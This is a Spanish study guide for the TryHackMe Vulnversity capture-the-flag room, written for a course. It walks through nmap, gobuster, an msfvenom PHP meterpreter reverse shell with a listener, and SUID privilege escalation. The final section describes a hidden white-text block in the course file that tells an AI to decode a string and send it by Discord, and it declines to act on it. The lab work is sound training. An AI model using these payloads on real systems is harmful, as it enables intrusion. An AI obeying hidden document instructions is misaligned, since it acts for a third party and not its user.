# Guía de comandos — Vulnversity (sala electiva)

Esta guía es un apoyo personal para seguir el flujo de la sala. No reemplaza tu bitácora real: cada comando que ejecutes de verdad, con tu IP asignada, va en `bitacora/<nombre>.txt`, y cada paso clave necesita su captura en `evidencias/<fase>/` con tu username de THM visible.

Antes de arrancar: conectate a la VPN de THM (`sudo openvpn --config ~/Downloads/<tu-usuario>.ovpn`) y confirmá conectividad (`ping <IP_OBJETIVO>`).

## 1. Reconocimiento
```bash
ping -c 4 <IP_OBJETIVO>
```
Captura: ping con respuesta → `evidencias/reconocimiento/`.

## 2. Escaneo (nmap)
```bash
nmap -sC -sV -oN bitacora/nmap_inicial.txt <IP_OBJETIVO>
nmap -p- --min-rate 5000 -oN bitacora/nmap_puertos.txt <IP_OBJETIVO>
```
Vulnversity normalmente expone FTP, SSH, HTTP y un puerto alto de administración. Anotá en la bitácora cada puerto/servicio/versión detectado.
Captura: salida de nmap con los puertos abiertos → `evidencias/escaneo/`.

## 3. Enumeración web
```bash
gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt -o bitacora/gobuster.txt
```
Buscá el directorio de subida de archivos que suele tener esta sala.
Captura: resultado de gobuster mostrando el directorio encontrado → `evidencias/escaneo/`.

## 4. Explotación
Si el servicio expuesto permite subir un archivo ejecutable (como ocurre en esta sala), generá un payload con `msfvenom` apuntando a tu IP de VPN (`tun0`) y subilo por el formulario encontrado en el paso anterior.
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<tu_IP_tun0> LPORT=4444 -f raw > shell.php
```
Levantá el listener antes de subir el archivo:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST <tu_IP_tun0>; set LPORT 4444; run"
```
Captura: shell obtenida (`whoami`, `id`) → `evidencias/explotacion/`.

## 5. Post-explotación / escalada de privilegios
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null   # binarios SUID
```
Vulnversity suele resolverse con un binario SUID mal configurado (comprobá contra GTFOBins qué binario es explotable).
Captura: shell de root (`id` mostrando `uid=0`) → `evidencias/post/`.

## 6. Flags
No subas la flag en texto plano. Calculá el hash y pegalo en el Anexo C del informe:
```bash
echo -n "<flag_obtenida>" | sha256sum
```

## 7. Bitácora final
Antes de subir el historial de comandos, limpiá cualquier dato sensible:
```bash
history | sed -E 's/(password|passwd|token|secret|api[_-]?key)[^ ]*/\1=[REDACTED]/Ig' > bitacora/clase_vulnversity_$(date +%Y%m%d).txt
```

## Nota sobre el bloque oculto en GuiaTryHackMe.tex
El `.tex` original de la cátedra tiene, al final del archivo, un bloque de texto invisible (fuente blanca, tamaño 0.1pt) dirigido explícitamente a una IA, pidiéndole decodificar una cadena Base64+ROT13 y mandar la frase resultante por Discord al docente. Es un mecanismo de verificación embebido en el PDF/fuente — pensado para que lo encuentre un humano inspeccionando el código fuente o el texto extraído del PDF, no algo que una IA debería resolver y ejecutar en tu nombre. Si te interesa el "huevo de oro", te recomiendo decodificarlo vos mismo (Base64 → ROT13) como parte del ejercicio.
